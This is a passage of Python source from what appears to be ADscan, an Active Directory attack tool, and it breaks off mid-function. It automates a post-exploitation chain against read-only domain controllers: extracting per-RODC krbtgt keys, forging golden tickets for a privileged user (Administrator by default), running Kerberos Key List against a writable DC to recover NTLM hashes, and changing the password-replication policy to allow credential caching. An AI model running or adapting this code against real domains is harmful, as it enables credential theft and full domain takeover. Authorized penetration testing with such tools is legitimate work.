    build_auth = getattr(shell, "build_auth_nxc", None)
    nxc_auth = None
    if callable(build_auth):
        nxc_auth = str(
            build_auth(
                username,
                password,
                target_domain or domain,
                kerberos=False,
            )
        )
    _run_rodc_krbtgt_followup(
        shell,
        domain=domain,
        target_domain=target_domain,
        target_computer=target_computer,
        auth_username=username,
        auth_secret=password,
        preferred_transport="auto",
        nxc_auth=nxc_auth,
        auth_kind_label="Reusable host access credential",
    )


def _run_rodc_prp_caching_followup(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    username: str,
    password: str,
) -> None:
    """Run the classic RODC PRP/cache follow-up against one explicit RODC target."""
    from adscan_internal.cli.rodc_escalation import offer_rodc_escalation

    offer_rodc_escalation(
        shell,
        domain=target_domain or domain,
        username=username,
        password=password,
        rodc_machine=target_computer,
    )


def _render_rodc_krbtgt_material_context(plan: RodcKrbtgtKeyPlan) -> None:
    """Render stored RODC krbtgt key material readiness without exposing keys."""
    key_inventory = []
    if plan.has_aes256:
        key_inventory.append("AES256")
    if plan.has_aes128:
        key_inventory.append("AES128")
    if plan.has_nt_hash:
        key_inventory.append("NT/RC4")

    lines = [
        f"Domain: {mark_sensitive(plan.domain, 'domain')}",
        f"RODC target: {mark_sensitive(plan.target_computer, 'user')}",
        f"Per-RODC krbtgt account: {mark_sensitive(plan.username, 'user')}",
        f"RID: {mark_sensitive(plan.rid or '-', 'detail')}",
        f"Preferred key: {mark_sensitive(plan.key_kind.upper(), 'detail')}",
        f"Available material: {mark_sensitive(', '.join(key_inventory) or '-', 'detail')}",
    ]
    if plan.target_host:
        lines.append(
            f"Material source host: {mark_sensitive(plan.target_host, 'hostname')}"
        )
    if plan.source:
        lines.append(f"Source: {mark_sensitive(plan.source, 'detail')}")

    print_panel(
        "\n".join(lines),
        title="[bold blue]RODC krbtgt Material Ready[/bold blue]",
        border_style=BRAND_COLORS["info"],
        expand=False,
    )


def _render_rodc_final_validation_plan(plan: RodcKrbtgtKeyPlan) -> None:
    """Render the final RODC validation workflow now available in ADscan."""
    lines = [
        f"Domain: {mark_sensitive(plan.domain, 'domain')}",
        f"RODC target: {mark_sensitive(plan.target_computer, 'user')}",
        f"Per-RODC krbtgt account: {mark_sensitive(plan.username, 'user')}",
        f"Preferred key material: {mark_sensitive(plan.key_kind.upper(), 'detail')}",
        "",
        "ADscan has recovered the per-RODC krbtgt material and can now automate the remaining validation flow from Linux.",
        "Recommended order: forge an RODC golden ticket with the correct RODC number/KVNO, then run a Kerberos Key List request against a writable DC.",
        "The Key List step needs AES material for the per-RODC krbtgt account; NT/RC4-only material is enough for ticket forging but not for Key List.",
    ]
    if plan.rid:
        lines.insert(3, f"RID: {mark_sensitive(plan.rid, 'detail')}")
    print_panel(
        "\n".join(lines),
        title="[bold yellow]RODC Golden Ticket Requirements[/bold yellow]",
        border_style=BRAND_COLORS["warning"],
        expand=False,
    )


def _resolve_current_rodc_key_plan(
    shell: Any,
    *,
    domain: str,
    target_computer: str,
) -> RodcKrbtgtKeyPlan | None:
    """Re-resolve the latest stored per-RODC krbtgt material for one target."""
    return resolve_rodc_krbtgt_key_plan(
        shell,
        domain=domain,
        target_computer=target_computer,
    )


def _resolve_required_rodc_key_plan(
    shell: Any,
    *,
    domain: str,
    target_computer: str,
    fallback: RodcKrbtgtKeyPlan,
) -> RodcKrbtgtKeyPlan:
    """Return the latest key plan, falling back to the captured plan when absent."""
    refreshed = _resolve_current_rodc_key_plan(
        shell,
        domain=domain,
        target_computer=target_computer,
    )
    return refreshed or fallback


def _render_rodc_golden_ticket_context(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
    target_user: str,
) -> None:
    """Render the stored forged-ticket context for one RODC user."""
    ticket_path = _resolve_existing_rodc_golden_ticket_path(
        shell,
        domain=domain,
        rodc_number=rodc_number,
        target_user=target_user,
    )
    lines = [
        f"Domain: {mark_sensitive(domain, 'domain')}",
        f"RODC number: {mark_sensitive(str(rodc_number), 'detail')}",
        f"Target user: {mark_sensitive(target_user, 'user')}",
        f"Stored ticket path: {mark_sensitive(ticket_path or '-', 'path')}",
    ]
    print_panel(
        "\n".join(lines),
        title="[bold blue]RODC Golden Ticket Context[/bold blue]",
        border_style=BRAND_COLORS["info"],
        expand=False,
    )


def _resolve_rodc_key_list_output_path(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
    target_user: str,
) -> str | None:
    """Return the persisted Key List output path when available."""
    from pathlib import Path

    workspace_dir = _resolve_workspace_dir(shell)
    if not workspace_dir:
        return None
    safe_user = target_user.replace("\\", "_").replace("/", "_").replace(":", "_")
    candidate = (
        Path(workspace_dir)
        / "domains"
        / domain
        / "kerberos"
        / "key_list"
        / f"rodc_{rodc_number}_{safe_user}.txt"
    )
    return str(candidate) if candidate.exists() else None


def _render_rodc_key_list_context(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
    target_user: str,
) -> None:
    """Render the stored Key List output context without dumping secrets inline."""
    output_path = _resolve_rodc_key_list_output_path(
        shell,
        domain=domain,
        rodc_number=rodc_number,
        target_user=target_user,
    )
    lines = [
        f"Domain: {mark_sensitive(domain, 'domain')}",
        f"RODC number: {mark_sensitive(str(rodc_number), 'detail')}",
        f"Target user: {mark_sensitive(target_user, 'user')}",
        f"Stored Key List output: {mark_sensitive(output_path or '-', 'path')}",
    ]
    print_panel(
        "\n".join(lines),
        title="[bold blue]Kerberos Key List Context[/bold blue]",
        border_style=BRAND_COLORS["info"],
        expand=False,
    )


def _resolve_workspace_dir(shell: Any) -> str:
    """Return the active workspace directory for follow-up artefacts."""
    resolver = getattr(shell, "_get_workspace_cwd", None)
    if callable(resolver):
        return str(resolver())
    return str(getattr(shell, "current_workspace_dir", "") or "")


def _resolve_rodc_golden_ticket_output_dir(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
) -> str:
    """Return the per-RODC directory used for forged-ticket artefacts."""
    import os

    workspace_dir = _resolve_workspace_dir(shell)
    output_dir = os.path.join(
        workspace_dir,
        "domains",
        domain,
        "kerberos",
        "rodc_golden_tickets",
        f"rodc_{rodc_number}",
    )
    os.makedirs(output_dir, exist_ok=True)
    return output_dir


def _resolve_rodc_key_material(
    shell: Any,
    *,
    plan: RodcKrbtgtKeyPlan,
) -> Any | None:
    """Return stored typed key material for one per-RODC krbtgt principal."""
    return CredentialStoreService().get_kerberos_key_material(
        domains_data=getattr(shell, "domains_data", {}),
        domain=plan.domain,
        username=plan.username,
    )


def _resolve_rodc_followup_target_user(shell: Any, *, domain: str) -> str | None:
    """Return the preferred privileged user for RODC validation follow-ups."""
    default_user = str(
        getattr(shell, "domains_data", {})
        .get(domain, {})
        .get("rodc_followup_default_user")
        or "Administrator"
    ).strip()
    if getattr(shell, "auto", False):
        return default_user

    selected = resolve_privileged_target_user(
        shell,
        domain=domain,
        purpose="RODC final validation",
        require_domain_admin=True,
        exclude_not_delegated=False,
        exclude_protected_users=False,
    )
    if selected:
        return selected
    raw_value = Prompt.ask(
        "Target user for the RODC golden ticket", default=default_user
    )
    candidate = strip_sensitive_markers(raw_value).strip()
    return candidate or default_user


def _resolve_rodc_target_identity(
    shell: Any,
    *,
    domain: str,
    target_user: str,
) -> tuple[str | None, int | None]:
    """Return ``(domain_sid, user_rid)`` for one target user."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    domain_sid = str(domain_data.get("domain_sid") or "").strip() or None
    user_sid = resolve_user_sid(shell, domain, target_user)
    if user_sid:
        parts = user_sid.split("-")
        if len(parts) >= 2 and parts[-1].isdigit():
            return domain_sid or "-".join(parts[:-1]), int(parts[-1])
    if str(target_user).strip().lower() == "administrator":
        return domain_sid, 500
    return domain_sid, None


def _resolve_writable_dc_host(shell: Any, *, domain: str) -> str:
    """Return the preferred writable DC hostname for final RODC validation."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    for key in ("pdc_hostname_fqdn", "pdc_hostname", "pdc", "dc"):
        candidate = str(domain_data.get(key) or "").strip()
        if candidate:
            return candidate
    return ""


def _resolve_existing_rodc_golden_ticket_path(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
    target_user: str,
) -> str | None:
    """Return an existing forged-ticket path when the expected artefact exists."""
    from pathlib import Path

    output_dir = Path(
        _resolve_rodc_golden_ticket_output_dir(
            shell,
            domain=domain,
            rodc_number=rodc_number,
        )
    )
    candidate = output_dir / f"{target_user}.ccache"
    if candidate.exists():
        return str(candidate)
    return None


def _save_rodc_key_list_output(
    shell: Any,
    *,
    domain: str,
    rodc_number: int,
    target_user: str,
    output: str,
) -> None:
    """Persist raw Key List output in the workspace for later review."""
    import os

    workspace_dir = _resolve_workspace_dir(shell)
    safe_user = target_user.replace("\\", "_").replace("/", "_").replace(":", "_")
    base_dir = os.path.join("domains", domain, "kerberos", "key_list")
    try:
        os.makedirs(os.path.join(workspace_dir, base_dir), exist_ok=True)
        path = os.path.join(
            workspace_dir,
            base_dir,
            f"rodc_{rodc_number}_{safe_user}.txt",
        )
        with open(path, "w", encoding="utf-8", errors="ignore") as handle:
            handle.write(output)
        print_info(f"Kerberos Key List output saved to {mark_sensitive(path, 'path')}.")
    except OSError as exc:
        print_info_debug(
            "[followup] failed to save Kerberos Key List output: "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"user={mark_sensitive(target_user, 'user')} "
            f"error={mark_sensitive(str(exc), 'detail')}"
        )


def _forge_rodc_golden_ticket(
    shell: Any,
    *,
    plan: RodcKrbtgtKeyPlan,
    target_user: str,
) -> str | None:
    """Forge and persist one RODC golden ticket for the selected user."""
    material = _resolve_rodc_key_material(shell, plan=plan)
    if material is None:
        print_error(
            f"No stored key material is available for {mark_sensitive(plan.username, 'user')}."
        )
        return None

    domain_sid, user_rid = _resolve_rodc_target_identity(
        shell,
        domain=plan.domain,
        target_user=target_user,
    )
    if not domain_sid or user_rid is None:
        print_error(
            f"Could not resolve the SID/RID required to forge a ticket for {mark_sensitive(target_user, 'user')}."
        )
        return None

    rodc_number = int(plan.rid)
    output_dir = _resolve_rodc_golden_ticket_output_dir(
        shell,
        domain=plan.domain,
        rodc_number=rodc_number,
    )
    request = RodcGoldenTicketRequest(
        domain=plan.domain.upper(),
        domain_sid=domain_sid,
        target_username=target_user,
        rodc_number=rodc_number,
        output_dir=output_dir,
        krbtgt_aes256=getattr(material, "aes256", None),
        krbtgt_nt_hash=getattr(material, "nt_hash", None),
        user_id=user_rid,
    )
    outcome = RodcGoldenTicketForger().forge(request)
    if not outcome.success or not outcome.ccache_path:
        print_error(
            "RODC golden ticket forging failed: "
            f"{mark_sensitive(outcome.error_message or 'unknown error', 'detail')}"
        )
        return None
    print_success(
        "Forged RODC golden ticket for "
        f"{mark_sensitive(target_user, 'user')} at {mark_sensitive(outcome.ccache_path, 'path')}."
    )
    RodcFollowupStateService().mark_golden_ticket_forged(
        shell,
        domain=plan.domain,
        target_computer=plan.target_computer,
        target_user=target_user,
        ticket_path=outcome.ccache_path,
    )
    return outcome.ccache_path


def _run_rodc_golden_ticket_followup(
    shell: Any,
    *,
    plan: RodcKrbtgtKeyPlan,
) -> None:
    """Execute the forged-ticket phase for one ready RODC context."""
    target_user = _resolve_rodc_followup_target_user(shell, domain=plan.domain)
    if not target_user:
        print_info("Skipping RODC golden ticket follow-up by user choice.")
        return
    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Forge RODC Golden Ticket",
    ):
        _forge_rodc_golden_ticket(
            shell,
            plan=plan,
            target_user=target_user,
        )


_RODC_PRP_NEEDED_PATTERNS = (
    "not allowed to have passwords replicated",
    "not in the allowed list",
    "denied",
    "kdc_err_policy",
)


def _key_list_error_suggests_prp_needed(error: str) -> bool:
    """Return True when the Key List error looks like a missing PRP allow-list entry."""
    lowered = str(error or "").lower()
    return any(pattern in lowered for pattern in _RODC_PRP_NEEDED_PATTERNS)


def _run_rodc_key_list_followup(
    shell: Any,
    *,
    plan: RodcKrbtgtKeyPlan,
) -> None:
    """Run the Kerberos Key List step using reusable per-RODC AES material."""
    material = _resolve_rodc_key_material(shell, plan=plan)
    if material is None:
        print_error(
            f"No stored key material is available for {mark_sensitive(plan.username, 'user')}."
        )
        return

    rodc_aes_key = str(
        getattr(material, "aes256", None) or getattr(material, "aes128", None) or ""
    ).strip()
    if not rodc_aes_key:
        print_warning(
            "Kerberos Key List requires AES material for the per-RODC krbtgt account; "
            "current workspace data only contains NT/RC4 material."
        )
        return

    target_user = _resolve_rodc_followup_target_user(shell, domain=plan.domain)
    if not target_user:
        print_info("Skipping Kerberos Key List follow-up by user choice.")
        return

    rodc_number = int(plan.rid)
    existing_ticket_path = _resolve_existing_rodc_golden_ticket_path(
        shell,
        domain=plan.domain,
        rodc_number=rodc_number,
        target_user=target_user,
    )
    if existing_ticket_path:
        print_info(
            f"Reusing existing RODC golden ticket for {mark_sensitive(target_user, 'user')} "
            f"at {mark_sensitive(existing_ticket_path, 'path')}."
        )
    ticket_path = existing_ticket_path or _forge_rodc_golden_ticket(
        shell,
        plan=plan,
        target_user=target_user,
    )
    if not ticket_path:
        return

    kdc_host = _resolve_writable_dc_host(shell, domain=plan.domain)
    if not kdc_host:
        print_error(
            f"Could not resolve a writable DC host for {mark_sensitive(plan.domain, 'domain')}."
        )
        return

    request = KerberosKeyListRequest(
        domain=plan.domain,
        kdc_host=kdc_host,
        rodc_number=rodc_number,
        rodc_aes_key=rodc_aes_key,
        targets=(target_user,),
        ccache_path=ticket_path,
        use_kerberos=True,
        dc_ip=str(
            getattr(shell, "domains_data", {}).get(plan.domain, {}).get("dc_ip") or ""
        ).strip()
        or None,
        impacket_scripts_dir=str(getattr(shell, "impacket_scripts_dir", "") or "").strip()
        or None,
    )

    with active_step_followup(
        shell,
        source="attack_path_runtime_followup",
        title="Run Kerberos Key List",
    ):
        outcome = KerberosKeyListService().run(
            request,
            run_command=getattr(shell, "run_command", None),
        )

    if outcome.raw_output:
        _save_rodc_key_list_output(
            shell,
            domain=plan.domain,
            rodc_number=rodc_number,
            target_user=target_user,
            output=outcome.raw_output,
        )
    if not outcome.success:
        error_detail = str(outcome.error_message or "unknown error")
        print_warning(
            "Kerberos Key List did not recover credentials: "
            f"{mark_sensitive(error_detail, 'detail')}"
        )
        if _key_list_error_suggests_prp_needed(error_detail):
            print_info(
                f"{mark_sensitive(target_user, 'user')} is not in the RODC allowed-replication "
                "policy. Use the 'Prepare RODC Credential Caching' step to add the account "
                "to the RODC password-replication policy first."
            )
        return

    for credential in outcome.credentials:
        add_credential = getattr(shell, "add_credential", None)
        if callable(add_credential):
            add_credential(
                credential.domain.lower(), credential.username, credential.nt_hash
            )

    recovered = ", ".join(
        mark_sensitive(item.username, "user") for item in outcome.credentials
    )
    RodcFollowupStateService().mark_key_list_completed(
        shell,
        domain=plan.domain,
        target_computer=plan.target_computer,
        target_user=target_user,
    )
    print_success(f"Kerberos Key List recovered NTLM material for {recovered}.")


def _build_rodc_extract_execution_options(
    shell: Any,
    *,
    plan: Any,
    extract_handler: Callable[[], None],
) -> list[FollowupExecutionOption]:
    """Return reuse/rerun/review options for the krbtgt extraction phase."""
    if not plan.krbtgt_key_plan:
        return []
    key_plan = plan.krbtgt_key_plan
    return [
        FollowupExecutionOption(
            key="reuse_stored_krbtgt",
            label="Continue with stored krbtgt material",
            description=(
                "Use the already stored per-RODC krbtgt material and avoid a new live extraction."
            ),
            handler=lambda key_plan=key_plan: _render_rodc_krbtgt_material_context(
                _resolve_required_rodc_key_plan(
                    shell,
                    domain=key_plan.domain,
                    target_computer=key_plan.target_computer,
                    fallback=key_plan,
                )
            ),
            recommended=True,
        ),
        FollowupExecutionOption(
            key="rerun_rodc_krbtgt_extraction",
            label="Re-extract krbtgt from the RODC",
            description=(
                "Repeat the live RODC krbtgt extraction now using the current host access path."
            ),
            handler=extract_handler,
        ),
        FollowupExecutionOption(
            key="review_stored_krbtgt",
            label="Review stored krbtgt material",
            description=(
                "Inspect the currently stored per-RODC krbtgt material before choosing the next step."
            ),
            handler=lambda key_plan=key_plan: _render_rodc_krbtgt_material_context(
                _resolve_required_rodc_key_plan(
                    shell,
                    domain=key_plan.domain,
                    target_computer=key_plan.target_computer,
                    fallback=key_plan,
                )
            ),
        ),
    ]


def _build_rodc_golden_ticket_execution_options(
    shell: Any,
    *,
    plan: Any,
    key_plan: RodcKrbtgtKeyPlan,
) -> list[FollowupExecutionOption]:
    """Return reuse/rerun/review options for one stored RODC golden ticket."""
    state = getattr(plan, "state", None)
    target_user = str(getattr(state, "current_target_user", "") or "").strip() or "Administrator"
    ticket_path = _resolve_existing_rodc_golden_ticket_path(
        shell,
        domain=key_plan.domain,
        rodc_number=int(key_plan.rid),
        target_user=target_user,
    )
    if not ticket_path:
        return []
    return [
        FollowupExecutionOption(
            key="reuse_stored_rodc_golden_ticket",
            label="Reuse stored golden ticket",
            description=(
                "Continue with the already forged ticket for the selected validation user."
            ),
            handler=lambda: print_success(
                "Using stored RODC golden ticket at "
                f"{mark_sensitive(ticket_path, 'path')}."
            ),
            recommended=True,
        ),
        FollowupExecutionOption(
            key="rerun_rodc_golden_ticket_forge",
            label="Re-forge the golden ticket",
            description=(
                "Forge a fresh RODC golden ticket now using the stored per-RODC krbtgt material."
            ),
            handler=lambda key_plan=key_plan: _run_rodc_golden_ticket_followup(
                shell,
                plan=_resolve_required_rodc_key_plan(
                    shell,
                    domain=key_plan.domain,
                    target_computer=key_plan.target_computer,
                    fallback=key_plan,
                ),
            ),
        ),
        FollowupExecutionOption(
            key="review_rodc_golden_ticket",
            label="Review stored golden ticket",
            description=(
                "Inspect the currently stored golden ticket path and selected target user."
            ),
            handler=lambda: _render_rodc_golden_ticket_context(
                shell,
                domain=key_plan.domain,
                rodc_number=int(key_plan.rid),
                target_user=target_user,
            ),
        ),
    ]


def _build_rodc_key_list_execution_options(
    shell: Any,
    *,
    plan: Any,
    key_plan: RodcKrbtgtKeyPlan,
) -> list[FollowupExecutionOption]:
    """Return reuse/rerun/review options for one Key List-capable RODC state."""
    state = getattr(plan, "state", None)
    target_user = str(getattr(state, "current_target_user", "") or "").strip() or "Administrator"
    output_path = _resolve_rodc_key_list_output_path(
        shell,
        domain=key_plan.domain,
        rodc_number=int(key_plan.rid),
        target_user=target_user,
    )
    if not output_path:
        return []
    return [
        FollowupExecutionOption(
            key="review_key_list_results",
            label="Review stored Key List results",
            description=(
                "Continue with the already recovered Key List output for this RODC user."
            ),
            handler=lambda: _render_rodc_key_list_context(
                shell,
                domain=key_plan.domain,
                rodc_number=int(key_plan.rid),
                target_user=target_user,
            ),
            recommended=True,
        ),
        FollowupExecutionOption(
            key="rerun_rodc_key_list",
            label="Re-run Kerberos Key List",
            description=(
                "Repeat the Key List request now against a writable DC."
            ),
            handler=lambda key_plan=key_plan: _run_rodc_key_list_followup(
                shell,
                plan=_resolve_required_rodc_key_plan(
                    shell,
                    domain=key_plan.domain,
                    target_computer=key_plan.target_computer,
                    fallback=key_plan,
                ),
            ),
        ),
    ]


def _build_rodc_host_access_followups(
    shell: Any,
    *,
    domain: str,
    target_domain: str,
    target_computer: str,
    auth_username: str,
    auth_secret: str,
    auth_mode: str,
    access_source: str = "",
    attacker_machine: str = "",
    target_spn: str = "",
    delegated_user: str = "",
    ticket_path: str = "",
    http_ticket_path: str | None = None,
) -> list[FollowupAction]:
    """Return RODC-specific follow-ups for any path that yields host access."""
    plan = resolve_rodc_followup_plan(
        shell,
        domain=domain,
        target_domain=target_domain,
        target_computer=target_computer,
        auth_username=auth_username,
        auth_secret=auth_secret,
        auth_mode=auth_mode,
        access_source=access_source,
        attacker_machine=attacker_machine,
        target_spn=target_spn,
        delegated_user=delegated_user,
        ticket_path=ticket_path,
    )
    if plan is None or not plan.is_rodc_target:
        return []

    marked_target = mark_sensitive(plan.target_computer, "user")
    followups: list[FollowupAction] = []
    if plan.auth_mode == "rbcd_ticket":
        extract_description = (
            f"Use the delegated CIFS ticket for {mark_sensitive(plan.auth_username, 'user')} "
            f"to run an authorized live RODC krbtgt extraction on {marked_target}."
        )

        def extract_handler() -> None:
            _run_rbcd_rodc_krbtgt_followup(
                shell,
                domain=plan.domain,
                target_domain=plan.target_domain,
                target_computer=plan.target_computer,
                delegated_user=plan.auth_username,
                ticket_path=plan.auth_secret,
                http_ticket_path=http_ticket_path or None,
            )

        prepare_description = (
            f"Use the delegated host access to prepare privileged credential caching "
            f"on {marked_target} by updating the RODC password-replication policy."
        )
    else:
        extract_description = (
            f"Use the current host access for {mark_sensitive(plan.auth_username, 'user')} "
            f"to run an authorized live RODC krbtgt extraction on {marked_target}."
        )

        def extract_handler() -> None:
            _run_host_access_rodc_krbtgt_followup(
                shell,
                domain=plan.domain,
                target_domain=plan.target_domain,
                target_computer=plan.target_computer,
                username=plan.auth_username,
                password=plan.auth_secret,
            )

        prepare_description = (
            f"Use the current host access to prepare privileged credential caching "
            f"on {marked_target} by updating the RODC password-replication policy."
        )

    def prepare_handler() -> None:
        _run_rodc_prp_caching_followup(
            shell,
            domain=plan.domain,
            target_domain=plan.target_domain,
            target_computer=plan.target_computer,
            username=plan.auth_username,
            password=plan.auth_secret,
        )

    for action_key in plan.action_keys:
        if action_key == "review_rbcd_ticket":
            marked_attacker = mark_sensitive(plan.attacker_machine, "user")
            marked_spn = mark_sensitive(plan.target_spn, "service")
            followups.append(
                FollowupAction(
                    key="review_rbcd_ticket",
                    title="Review Delegated Ticket Context",
                    description=(
                        f"Review the prepared RBCD context for {marked_target}: "
                        f"{marked_attacker} now has a delegated path toward {marked_spn}."
                    ),
                    handler=lambda: _render_rbcd_prepared_context(
                        domain=plan.domain,
                        target_domain=plan.target_domain,
                        target_computer=plan.target_computer,
                        attacker_machine=plan.attacker_machine,
                        target_spn=plan.target_spn,
                        delegated_user=plan.delegated_user or None,
                        ticket_path=plan.ticket_path or None,
                    ),
                )
            )
            continue
        if action_key == "review_rodc_krbtgt_material" and plan.krbtgt_key_plan:
            key_plan = plan.krbtgt_key_plan
            followups.append(
                FollowupAction(
                    key="review_rodc_krbtgt_material",
                    title="Review RODC krbtgt Material",
                    description=(
                        f"Review stored per-RODC krbtgt material for {marked_target}; "
                        f"preferred key is {mark_sensitive(key_plan.key_kind.upper(), 'detail')}."
                    ),
                    handler=lambda key_plan=key_plan: _render_rodc_krbtgt_material_context(
                        _resolve_required_rodc_key_plan(
                            shell,
                            domain=key_plan.domain,
                            target_computer=key_plan.target_computer,
                            fallback=key_plan,
                        )
                    ),
                )
            )
            continue
        if action_key == "review_rodc_final_validation_plan" and plan.krbtgt_key_plan:
            key_plan = plan.krbtgt_key_plan
            followups.append(
                FollowupAction(
                    key="review_rodc_final_validation_plan",
                    title="Review Final RODC Validation Plan",
                    description=(
                        f"Review the final RODC validation workflow for {marked_target}; "
                        "ADscan can forge tickets and run Key List from Linux."
                    ),
                    handler=lambda key_plan=key_plan: _render_rodc_final_validation_plan(
                        _resolve_required_rodc_key_plan(
                            shell,
                            domain=key_plan.domain,
                            target_computer=key_plan.target_computer,
                            fallback=key_plan,
                        )
                    ),
                )
            )
            continue
        if action_key == "forge_rodc_golden_ticket" and plan.krbtgt_key_plan:
            key_plan = plan.krbtgt_key_plan
            has_stored_ticket = bool(
                getattr(plan, "state", None)
                and getattr(plan.state, "has_golden_ticket", False)
            )
            followups.append(
                FollowupAction(
                    key="forge_rodc_golden_ticket",
                    title=(
                        "Use or Re-forge RODC Golden Ticket"
                        if has_stored_ticket
                        else "Forge RODC Golden Ticket"
                    ),
                    description=(
                        (
                            f"Reuse or re-forge the RODC golden ticket for {marked_target} "
                            "using the stored per-RODC krbtgt material."
                            if has_stored_ticket
                            else f"Forge a reusable RODC golden ticket for {marked_target} "
                            "using the stored per-RODC krbtgt material."
                        )
                    ),
                    handler=lambda key_plan=key_plan: _run_rodc_golden_ticket_followup(
                        shell,
                        plan=_resolve_required_rodc_key_plan(
                            shell,
                            domain=key_plan.domain,
                            target_computer=key_plan.target_computer,
                            fallback=key_plan,
                        ),
                    ),
                    execution_options_factory=lambda key_plan=key_plan, plan=plan: _build_rodc_golden_ticket_execution_options(
                        shell,
                        plan=plan,
                        key_plan=_resolve_required_rodc_key_plan(
                            shell,
                            domain=key_plan.domain,
                            target_computer=key_plan.target_computer,
                            fallback=key_plan,
                        ),
                    ),
                )
            )
            continue
        if action_key == "run_rodc_kerberos_key_list" and plan.krbtgt_key_plan:
            key_plan = plan.krbtgt_key_plan
            has_stored_key_list = bool(
                getattr(plan, "state", None)
                and getattr(plan.state, "has_key_list_results", False)
            )
            followups.append(
                FollowupAction(
                    key="run_rodc_kerberos_key_list",
                    title=(
                        "Review or Re-run Kerberos Key List"
                        if has_stored_key_list
                        else "Run Kerberos Key List"
                    ),
                    description=(
                        (
                            f"Review or re-run Kerberos Key List for {marked_target} "
                            "using the stored per-RODC AES material."
                            if has_stored_key_list
                            else f"Use the stored per-RODC AES material for {marked_target} "
                            "to request Key List secrets from a writable DC."
                        )
                    ),
                    handler=lambda key_plan=key_plan: _run_rodc_key_list_followup(
                        shell,
                        plan=_resolve_required_rodc_key_plan(
                            shell,
                            domain=key_plan.domain,
                            target_computer=key_plan.target_computer,
                            fallback=key_plan,
                        ),
                    ),
                    execution_options_factory=lambda key_plan=key_plan, plan=plan: _build_rodc_key_list_execution_options(
                        shell,
                        plan=plan,
                        key_plan=_resolve_required_rodc_key_plan(
                            shell,
                            domain=key_plan.domain,
                            target_computer=key_plan.target_computer,
                            fallback=key_plan,
                        ),
                    ),
                )
            )
            continue
        if action_key == "extract_rodc_krbtgt_secret" and plan.can_extract_krbtgt:
            has_stored_krbtgt = bool(plan.krbtgt_key_plan)
            followups.append(
                FollowupAction(
                    key="extract_rodc_krbtgt_secret",
                    title=(
                        "Use or Re-extract RODC krbtgt Secret"
                        if has_stored_krbtgt
                        else "Extract RODC krbtgt Secret"
                    ),
                    description=(
                        (
                            f"A stored per-RODC krbtgt secret already exists for {marked_target}; "
                            "reuse it by default or re-run the live extraction."
                        )
                        if has_stored_krbtgt
                        else extract_description
                    ),
                    handler=extract_handler,
                    execution_options_factory=lambda plan=plan, extract_handler=extract_handler: _build_rodc_extract_execution_options(
                        shell,
                        plan=plan,
                        extract_handler=extract_handler,
                    ),
                )
            )
            continue
        if (
            action_key == "prepare_rodc_credential_caching"
            and plan.can_prepare_credential_caching
        ):
            followups.append(
                FollowupAction(
                    key="prepare_rodc_credential_caching",
                    title="Prepare RODC Credential Caching",
                    description=prepare_description,
                    handler=prepare_handler,
                )
            )
    return followups


def _persist_rodc_krbtgt_outcome(
    shell: Any,
    *,
    domain: str,
    host: str,
    outcome: Any,
) -> None:
    """Persist parsed RODC krbtgt material and render a concise summary."""
    if outcome.output:
        _save_rodc_krbtgt_output(shell, domain=domain, host=host, output=outcome.output)
    if not outcome.success or not outcome.credentials:
        detail = outcome.error_message or "No per-RODC krbtgt secret was parsed."
        print_warning(
            "RODC krbtgt extraction did not recover credential material: "
            f"{mark_sensitive(detail, 'detail')}"
        )
        return

    RodcFollowupStateService().mark_krbtgt_extracted(
        shell,
        domain=domain,
        target_computer=host,
    )

    for credential in outcome.credentials:
        try:
            from adscan_internal.cli.creds import store_kerberos_principal_material

            store_kerberos_principal_material(
                shell=shell,
                domain=domain,
                username=credential.username,
                nt_hash=credential.nt_hash,
                aes256=credential.aes256,
                aes128=credential.aes128,
                source="rodc_krbtgt_extraction",
                target_host=host,
                rid=str(getattr(credential, "rid", "") or ""),
            )
        except Exception as exc:  # noqa: BLE001
            print_info_debug(
                "[followup] failed to store Kerberos key material for "
                f"{mark_sensitive(credential.username, 'user')}: "
                f"{mark_sensitive(str(exc), 'detail')}"
            )
        if credential.nt_hash:
            print_info_debug(
                "[followup] persisted NTLM/RC4 material only in kerberos_keys for "
                f"{mark_sensitive(credential.username, 'user')} "
                "(skipping generic add_credential pipeline)."
            )
        if credential.aes256 or credential.aes128:
            print_info_debug(
                "[followup] parsed Kerberos key material for "
                f"{mark_sensitive(credential.username, 'user')} "
                f"aes256={bool(credential.aes256)} aes128={bool(credential.aes128)}"
            )

    recovered = ", ".join(
        mark_sensitive(item.username, "user") for item in outcome.credentials
    )
    print_success(
        "Recovered per-RODC krbtgt material: "
        f"{recovered}. ADscan can now continue with the RODC golden ticket and, when AES is present, the Key List workflow."
    )


def _save_rodc_krbtgt_output(
    shell: Any,
    *,
    domain: str,
    host: str,
    output: str,
) -> None:
    """Persist raw extractor output in the domain workspace for review."""
    import os

    safe_host = host.replace("\\", "_").replace("/", "_").replace(":", "_")
    base_dir = os.path.join("domains", domain, "smb", "rodc_krbtgt")
    try:
        os.makedirs(base_dir, exist_ok=True)
        path = os.path.join(base_dir, f"{safe_host}.txt")
        with open(path, "w", encoding="utf-8", errors="ignore") as handle:
            handle.write(output)
        print_info(
            f"RODC krbtgt extraction output saved to {mark_sensitive(path, 'path')}."
        )
    except Exception as exc:  # noqa: BLE001
        print_info_debug(
            "[followup] failed to save RODC krbtgt extraction output: "
            f"domain={mark_sensitive(domain, 'domain')} "
            f"host={mark_sensitive(host, 'hostname')} "
            f"error={mark_sensitive(str(exc), 'detail')}"
        )


def build_followups_for_step(
    shell: Any,
    *,
    domain: str,
    step_action: str,
    exec_username: str,
    exec_password: str,
    target_kind: str,
    target_label: str,
    target_domain: str,
    target_sam_or_label: str,
) -> list[FollowupAction]:
    """Return follow-up actions for a given executed step (best-effort)."""
    action = (step_action or "").strip().lower()
    kind = (target_kind or "").strip().lower()

    followups: list[FollowupAction] = []

    if action == "adminto":
        marked_target = mark_sensitive(target_label or target_sam_or_label, "hostname")
        rodc_followups = _build_rodc_host_access_followups(
            shell,
            domain=domain,
            target_domain=target_domain,
            target_computer=target_sam_or_label,
            auth_username=exec_username,
            auth_secret=exec_password,
            auth_mode="host_access",
